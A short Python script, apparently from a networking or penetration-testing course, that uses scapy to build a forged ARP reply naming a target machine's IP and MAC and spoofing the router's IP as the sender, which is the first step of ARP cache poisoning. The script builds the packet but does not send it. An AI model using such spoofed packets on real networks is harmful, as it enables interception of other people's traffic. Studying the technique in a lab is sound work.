#!/usr/bin/env python3
import scapy.all as scapy

scapy.ls(scapy.ARP) #in terminal
#pdst is the ip of the target computer
#hwdst mac of target
#psrc is ip of router
#op 2 is response, instead of request

packet = scapy.ARP(op=2, pdst="10.0.2.3", hwdst="08:00:27:4d:08:65", psrc="10.0.2.1 ")